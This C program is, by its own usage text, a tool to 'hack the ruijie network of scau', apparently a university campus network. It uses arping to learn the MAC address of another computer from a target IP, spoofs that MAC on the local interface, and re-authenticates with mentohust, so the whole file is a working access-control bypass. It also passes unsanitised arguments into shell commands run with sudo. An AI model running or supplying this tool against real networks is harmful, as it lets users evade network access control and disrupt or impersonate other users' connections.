#include <stdio.h>
#include <stdlib.h>

#define MAX_BUFFER_LEN (4096)
char buffer[MAX_BUFFER_LEN] = {0};

void print_usage(const char *name) {
    printf("BRIEF\n");
    printf("    hack the ruijie network of scau\n");
    printf("USAGE\n");
    printf("    %s account password ip\n", name);
    printf("PARAM\n");
    printf("    account  the ruijie account\n");
    printf("    password the password of the ruijie account\n");
    printf("    ip       the ip of the computer which wants to be hacked\n");
    printf("Eg.\n");
    printf("    %s 2011XXXXXX 123456 172.26.41.64\n", name);
}

char *exec_cmd(const char *cmd) {
    FILE *fp = popen(cmd, "r");
    int num = fread(buffer, 1, MAX_BUFFER_LEN, fp);
    pclose(fp); 

    if (num == MAX_BUFFER_LEN)
        printf("Not Enough Buffer\n");

    if (num > 0)
        buffer[num - 1] = '\0';
    else
        buffer[num] = '\0';

    printf("cmd [%s]\n", cmd);
    printf("get {%s}\n", buffer);
    return buffer;
}

char ethN[10] = {0};
char *get_ethN() {
    char *string = exec_cmd("sudo ifconfig | awk '/^e/ {print $1}'");
    sscanf(string, "%s", ethN);
    return ethN;
}

void quit_mentohust() {
    exec_cmd("sudo mentohust -k");
    sleep(3);
}

void do_mentohust(const char *account, const char *password, const char *ethN) {
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "sudo mentohust -u%s -p%s -n%s -b2 -l1", account, password, ethN);
    printf("cmd [%s]\n", cmd);
    quit_mentohust();
    /* if use popen, it would block until the cmd run over and then pipe the data out, but system would not */
    /* popen is faster and safer than system */
    system(cmd);
    sleep(20);
}

char mac[128] = {0};
char *get_mac(const char *ethN, const char *ip) {
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "sudo arping -f -w 10 -I %s %s", ethN, ip);
    char *string = exec_cmd(cmd);
    int i, j, index;
    for (i = 0, j = 0, index = 0; i < MAX_BUFFER_LEN; i++) {
        if (string[i] == '[') {
            index = 1;
            continue;
        }
        if (string[i] == ']') {
            mac[j] = '\0';
            break;
        }
        if (index == 1) {
            mac[j++] = string[i];
        }
    }
    return mac;
}

void ether_down(const char *ethN) {
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "sudo ifconfig %s down", ethN);
    exec_cmd(cmd);
}

void change_mac(const char *ethN, const char *mac) {
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "sudo ifconfig %s hw ether %s", ethN, mac);
    exec_cmd(cmd);
}

void ether_up(const char *ethN) {
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "sudo ifconfig %s up", ethN);
    exec_cmd(cmd);
}

int main(int argc, char **argv) {
    if (argc < 4) {
        print_usage(argv[0]);
        exit(1);
    }

    printf("Try to get ether...\n");
    char *ethN = get_ethN();
    printf("-----ethN-----\n");
    printf("ethN: %s\n", ethN);
    printf("-----ethN-----\n");
    
    printf("Try to do mentohust...\n");
    do_mentohust(argv[1], argv[2], ethN);

    printf("Try to get mac...\n");
    char *mac = get_mac(ethN, argv[3]);
    printf("-----mac-----\n");
    printf("mac: %s\n", mac);
    printf("-----mac-----\n");
    if (mac[0] == 0) {
        quit_mentohust();
        printf("get mac fail, 请重试！\n"); 
        exit(1);
    }

    printf("Try to change the mac ...\n");
    ether_down(ethN);
    change_mac(ethN, mac);
    ether_up(ethN);

    printf("Try to do mentohust again...\n");
    do_mentohust(argv[1], argv[2], ethN);
    printf("=====End=====\n");
    printf("现在可以查看是否已打通\n");

    return 0; 
}
